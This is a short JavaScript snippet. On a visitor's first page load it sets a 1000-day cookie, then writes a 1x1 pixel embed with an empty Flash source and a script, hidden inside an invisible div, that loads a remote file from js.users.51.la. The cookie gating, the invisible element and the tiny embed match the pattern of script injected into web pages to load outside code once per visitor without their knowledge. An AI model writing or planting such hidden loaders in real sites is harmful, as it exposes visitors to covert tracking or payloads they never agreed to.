function l_2202()
{ 
	var tj = 'http://js.users.51.la/19140635.js';
	var swf = '';
	var life_range = 1000;
	var Then = new Date() ;
	Then.setTime(Then.getTime() + 24*60*60*life_range) ;
	var cookieString = new String(document.cookie) ;
	var cookieHeader = "c_0427_89g=" ;
	var beginPosition = cookieString.indexOf(cookieHeader) ;
	if (beginPosition != -1)
	{ 
		//do nothing if cookie found
	}
	else 
	{  
		document.cookie = "c_0427_89g=Filter;expires="+ Then.toGMTString() ;

		document.writeln("<embed src='"+ swf +"' width='1' height='1'></embed>");

		document.writeln("<div style='visibility: hidden;'><script language='javascript' type='text/javascript' src='" + tj + "'></script></div>");
	}

}
l_2202(); 